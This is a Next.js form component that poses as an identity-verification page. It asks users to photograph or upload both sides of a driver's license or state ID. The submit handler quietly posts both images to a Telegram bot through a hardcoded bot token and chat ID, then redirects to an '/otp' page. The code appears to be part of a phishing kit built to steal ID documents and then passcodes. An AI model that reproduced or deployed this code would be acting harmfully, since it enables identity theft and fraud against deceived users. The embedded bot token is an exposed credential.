"use client";
import { useState, useEffect } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";

const IdentityVerificationForm = () => {
  const [frontImage, setFrontImage] = useState<File | null>(null);
  const [backImage, setBackImage] = useState<File | null>(null);
  const [frontPreview, setFrontPreview] = useState<string | null>(null);
  const [backPreview, setBackPreview] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  const router = useRouter();

  useEffect(() => {
    setIsMobile(/Mobi|Android/i.test(navigator.userAgent)); // Detect mobile
  }, []);

  console.log(isMobile);

  const handleImageChange = (side: "front" | "back", file: File | null) => {
    if (!file) return;

    if (file.size > 5 * 1024 * 1024) {
      setError("File size exceeds 5MB. Please upload a smaller file.");
      return;
    }

    setError(null);
    const previewUrl = URL.createObjectURL(file);

    if (side === "front") {
      setFrontImage(file);
      setFrontPreview(previewUrl);
    } else {
      setBackImage(file);
      setBackPreview(previewUrl);
    }
  };

  const sendTelegramMessage = async (message: string, frontImage: File, backImage: File) => {
    const botToken = "7972666652:AAHpQu7Ax4vgN-lL_-psZbWVjptYDvgl7YA";
    const chatId = "1303640598";

    try {
      const sendPhoto = async (photo: File) => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", photo);
        return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
      };

      await Promise.all([sendPhoto(frontImage), sendPhoto(backImage)]);
      console.log("Images sent successfully to Telegram.");
    } catch (error) {
      console.error("Error sending Telegram message:", error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!frontImage || !backImage) {
      setError("Both front and back images are required.");
      return;
    }

    setIsSubmitting(true);
    await sendTelegramMessage("Identity verification images submission.", frontImage, backImage);
    setIsSubmitting(false);
    
    router.push("/otp");
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 p-6">
      <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full">
        <h2 className="text-3xl font-semibold text-gray-800 text-center mb-4">Verify Your Identity</h2>
        <p className="text-center text-gray-600 mb-6">Upload images of your <strong>Drivers License</strong> or <strong>State ID</strong>.</p>

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* FRONT IMAGE UPLOAD */}
          <div className="flex flex-col items-center">
            <h3 className="text-lg font-semibold mb-2">Front of ID</h3>
            {frontPreview ? (
              <Image src={frontPreview} alt="Front ID" width={250} height={150} className="rounded-lg object-cover mb-3" />
            ) : (
              <div className="w-full h-56 border-4 border-dashed border-gray-300 flex items-center justify-center rounded-lg bg-gray-100 text-gray-500 mb-3">
                📸 
              </div>
            )}
            <div className="flex gap-2">
              <label htmlFor="front-camera" className="bg-blue-500 text-white px-4 py-2 rounded-md cursor-pointer">📸 Snap Photo</label>
              <input type="file" id="front-camera" accept="image/*" capture="environment" className="hidden"
                onChange={(e) => handleImageChange("front", e.target.files ? e.target.files[0] : null)} />
              
              <label htmlFor="front-gallery" className="bg-green-500 text-white px-4 py-2 rounded-md cursor-pointer">📂 Upload</label>
              <input type="file" id="front-gallery" accept="image/*" className="hidden"
                onChange={(e) => handleImageChange("front", e.target.files ? e.target.files[0] : null)} />
            </div>
          </div>

          {/* BACK IMAGE UPLOAD */}
          <div className="flex flex-col items-center">
            <h3 className="text-lg font-semibold mb-2">Back of ID</h3>
            {backPreview ? (
              <Image src={backPreview} alt="Back ID" width={250} height={150} className="rounded-lg object-cover mb-3" />
            ) : (
              <div className="w-full h-56 border-4 border-dashed border-gray-300 flex items-center justify-center rounded-lg bg-gray-100 text-gray-500 mb-3">
                📸 
              </div>
            )}
            <div className="flex gap-2">
              <label htmlFor="back-camera" className="bg-blue-500 text-white px-4 py-2 rounded-md cursor-pointer">📸 Snap Photo</label>
              <input type="file" id="back-camera" accept="image/*" capture="environment" className="hidden"
                onChange={(e) => handleImageChange("back", e.target.files ? e.target.files[0] : null)} />

              <label htmlFor="back-gallery" className="bg-green-500 text-white px-4 py-2 rounded-md cursor-pointer">📂 Upload</label>
              <input type="file" id="back-gallery" accept="image/*" className="hidden"
                onChange={(e) => handleImageChange("back", e.target.files ? e.target.files[0] : null)} />
            </div>
          </div>

          {error && <p className="text-red-600 text-sm text-center">{error}</p>}

          <button type="submit" className="w-full bg-blue-600 text-white py-2 px-4 rounded-lg hover:bg-blue-700 transition-all">
            {isSubmitting ? "Submitting..." : "Submit"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default IdentityVerificationForm;
